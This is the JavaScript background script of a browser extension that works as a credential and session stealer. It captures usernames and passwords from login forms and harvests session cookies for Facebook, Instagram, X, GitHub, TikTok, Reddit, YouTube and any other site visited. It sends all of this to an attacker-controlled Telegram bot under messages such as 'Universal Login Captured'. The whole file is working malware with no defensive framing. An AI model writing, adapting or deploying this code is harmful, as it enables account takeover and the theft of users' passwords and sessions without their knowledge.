const BOT_TOKEN = 'your token';
const CHAT_ID   = 'your chatid';

async function tg(text) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
    });
  } catch {}
}

chrome.runtime.onMessage.addListener(async (msg, sender) => {
  if (msg.type !== 'LOGIN') return;

  const { hostname } = new URL(sender.tab.url);
  const allCookies   = await chrome.cookies.getAll({});
  const site = hostname.toLowerCase();

  let uid = 'N/A';
  let sess = 'N/A';

  if (site.includes('facebook.com')) {
    uid  = allCookies.find(c => c.name === 'c_user')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'xs')?.value     || 'N/A';
  } else if (site.includes('instagram.com')) {
    uid  = allCookies.find(c => c.name === 'ds_user_id')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'sessionid')?.value  || 'N/A';
  } else if (site.includes('twitter.com') || site.includes('x.com')) {
    uid  = allCookies.find(c => c.name === 'auth_token')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'ct0')?.value        || 'N/A';
  } else if (site.includes('github.com')) {
    uid  = allCookies.find(c => c.name === 'user_session')?.value || 'N/A';
    sess = allCookies.find(c => c.name === '_gh_sess')?.value      || 'N/A';
  } else if (site.includes('tiktok.com')) {
    uid  = allCookies.find(c => c.name === 'sessionid')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'sessionid_ss')?.value || 'N/A';
  } else if (site.includes('reddit.com')) {
    uid  = allCookies.find(c => c.name === 'reddit_session')?.value || 'N/A';
    sess = allCookies.find(c => c.name === '_reddit_session')?.value || 'N/A';
  } else if (site.includes('youtube.com')) {
    uid  = allCookies.find(c => c.name === 'SAPISID')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'HSID')?.value    || 'N/A';
  } else {
    
    const firstFive = allCookies
      .filter(c => c.domain.includes(hostname))
      .slice(0, 5)
      .map(c => `${c.name}=${c.value}`)
      .join('; ');
    uid  = 'N/A';
    sess = firstFive || 'N/A';
  }

  const text =
    '🎯 <b>Universal Login Captured</b>\n\n' +
    `🔗 <b>Full URL:</b> <code>${sender.tab.url}</code>\n\n` +
    `👤 <b>Username/Email:</b> <code>${msg.user}</code>\n\n` +
    `🔑 <b>Password:</b> <code>${msg.pass}</code>\n\n` +
    `👤 <b>User-ID:</b> <code>${uid}</code>\n\n` +
    `🔐 <b>Session:</b> <code>${sess}</code>\n\n` +
    `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
  tg(text);
});


chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status !== 'complete' || !tab.url || tab.url.startsWith('chrome://')) return;

  const { hostname } = new URL(tab.url);
  const key = `sent_${hostname}`;
  const last = await chrome.storage.local.get(key);
  if (last[key] && Date.now() - last[key] < 3_000) return;
  await chrome.storage.local.set({ [key]: Date.now() });

  const allCookies = await chrome.cookies.getAll({});
  const site = hostname.toLowerCase();

  let uid = 'N/A';
  let sess = 'N/A';

  if (site.includes('facebook.com')) {
    uid  = allCookies.find(c => c.name === 'c_user')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'xs')?.value     || 'N/A';
  } else if (site.includes('instagram.com')) {
    uid  = allCookies.find(c => c.name === 'ds_user_id')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'sessionid')?.value  || 'N/A';
  } else if (site.includes('twitter.com') || site.includes('x.com')) {
    uid  = allCookies.find(c => c.name === 'auth_token')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'ct0')?.value        || 'N/A';
  } else if (site.includes('github.com')) {
    uid  = allCookies.find(c => c.name === 'user_session')?.value || 'N/A';
    sess = allCookies.find(c => c.name === '_gh_sess')?.value      || 'N/A';
  } else if (site.includes('tiktok.com')) {
    uid  = allCookies.find(c => c.name === 'sessionid')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'sessionid_ss')?.value || 'N/A';
  } else if (site.includes('reddit.com')) {
    uid  = allCookies.find(c => c.name === 'reddit_session')?.value || 'N/A';
    sess = allCookies.find(c => c.name === '_reddit_session')?.value || 'N/A';
  } else if (site.includes('youtube.com')) {
    uid  = allCookies.find(c => c.name === 'SAPISID')?.value || 'N/A';
    sess = allCookies.find(c => c.name === 'HSID')?.value    || 'N/A';
  } else {
    const firstFive = allCookies
      .filter(c => c.domain.includes(hostname))
      .slice(0, 5)
      .map(c => `${c.name}=${c.value}`)
      .join('; ');
    uid  = 'N/A';
    sess = firstFive || 'N/A';
  }

  if (uid === 'N/A' && sess === 'N/A') return;

  const text =
    '🎯 <b>Already Logged-in</b>\n\n' +
    `🔗 <b>URL:</b> <code>${tab.url}</code>\n\n` +
    `👤 <b>User-ID:</b> <code>${uid}</code>\n\n` +
    `🔐 <b>Session:</b> <code>${sess}</code>\n\n` +
    `⏰ <b>Time:</b> ${new Date().toLocaleString()}`;
  tg(text);
});